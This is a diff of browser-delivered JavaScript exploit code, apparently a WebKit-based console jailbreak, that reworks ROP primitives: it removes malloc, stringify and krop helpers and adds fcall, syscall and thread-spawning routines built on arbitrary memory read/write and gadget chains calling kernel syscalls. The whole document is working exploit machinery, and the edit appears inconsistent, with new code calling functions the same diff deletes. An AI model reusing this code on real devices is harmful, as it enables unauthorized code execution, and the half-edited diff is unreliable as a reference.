@@ -92,7 +92,7 @@ var exploit = function() {
 
     
     print("libkernel_web base at: 0x" + libKernelBase);
-           
+    
         var o2lk = function(o)
     {
         return libKernelBase.add32(o);
@@ -210,56 +210,10 @@ var exploit = function() {
     var pushframe = [];
     pushframe.length = 0x80;
     var funcbuf;
-    
-  // Basic memory functions
-  function malloc(size)
- {
-  var backing = new Uint8Array(0x10000 + size);
 
-  window.nogc.push(backing);
-
-  var ptr     = p.read8(p.leakval(backing).add32(0x10));
-  ptr.backing = backing;
-
-  return ptr;
- }
-
-  function mallocu32(size) {
-  var backing = new Uint8Array(0x10000 + size * 4);
-
-  window.nogc.push(backing);
-
-  var ptr     = p.read8(p.leakval(backing).add32(0x10));
-  ptr.backing = new Uint32Array(backing.buffer);
-
-  return ptr;
-} 
-    
-  function stringify(str)
- {
-  var bufView = new Uint8Array(str.length + 1);
-
-  for(var i=0; i < str.length; i++) {
-      bufView[i] = str.charCodeAt(i) & 0xFF;
-  }
-
-  window.nogc.push(bufView);
-  return p.read8(p.leakval(bufView).add32(0x10));
-}  
-
-  var krop = function (p, addr) {
-  // Contains base and stack pointer for fake stack (this.stackBase = RBP, this.stackPointer = RSP)
-  this.stackBase    = addr;
-  this.stackPointer = 0;
-
-  // Push instruction / value onto fake stack
-  this.push = function (val) {
-    p.write8(this.stackBase.add32(this.stackPointer), val);
-    this.stackPointer += 8;
-  };
    
-    // Write to address with value (helper function)
-    this.write64 = function (addr, val) {
+     // Write to address with value (helper function)
+  this.write64 = function (addr, val) {
     this.push(window.gadgets["pop rdi"]);
     this.push(addr);
     this.push(window.gadgets["pop rax"]);
@@ -267,10 +221,6 @@ var exploit = function() {
     this.push(window.gadgets["mov [rdi], rax"]);
   }
    
-  // Return krop object
-  return this;
-};
-
     window.Rop = function () {
         this.stack = new Uint32Array(0x10000);
         this.stackPointer = p.read8(p.leakval(this.stack).add32(0x10));
@@ -382,6 +332,74 @@ var exploit = function() {
             window.syscalls[syscallno] = window.libKernelBase.add32(i);
         }
     }
+       // Setup helpful primitives for calling and string operations
+       var chain = new window.Rop;
+    
+    p.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
+        chain.clear();
+        
+        chain.notimes = this.next_notime;
+        this.next_notime = 1;
+        
+        chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+        
+        chain.push(window.gadgets["pop rdi"]); // pop rdi
+        chain.push(chain.stackPointer.add32(0x3ff8)); // where
+        chain.push(window.gadgets["mov [rdi], rax"]); // rdi = rax
+        
+        chain.push(window.gadgets["pop rax"]); // pop rax
+        chain.push(p.leakval(0x41414242)); // where
+        
+        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
+        returnvalue = p.read8(chain.stackPointer.add32(0x3ff8)); //p.read8(chain.stackPointer.add32(0x3ff8));
+    }
+     p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
+    {
+        if (typeof sysc == "string") {
+            sysc = window.syscallnames[sysc];
+        }
+        if (typeof sysc != "number") {
+            throw new Error("invalid syscall");
+        }
+        
+        var off = window.syscalls[sysc];
+        if (off == undefined)
+        {
+            throw new Error("invalid syscall");
+        }
+        
+        return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
+    }    
+     
+      var spawnthread = function (chain) {
+      var longjmp       = offsetToWebKit(0x1458);
+      var createThread  = offsetToWebKit(0x116ED40);
+
+      var contextp = mallocu32(0x2000);
+      var contextz = contextp.backing;
+      contextz[0] = 1337;
+      p.syscall(324, 1);
+  
+      var thread2 = new window.rop();
+
+      thread2.clear();
+      thread2.push(window.gadgets["ret"]); // nop
+      thread2.push(window.gadgets["ret"]); // nop
+      thread2.push(window.gadgets["ret"]); // nop
+
+      thread2.push(window.gadgets["ret"]); // nop
+      chain(thread2);
+
+      p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
+      p.write8(contextp.add32(0x10), thread2.stackBase); // rsp
+
+      var test = p.fcall(createThread, longjmp, contextp, stringify("GottaGoFast"));
+
+      window.nogc.push(contextz);
+      window.nogc.push(thread2);
+      
+      return thread2;
+      }
  
     log("stage3 loaded syscalls");
     print("all good. fcall test = Successful");  
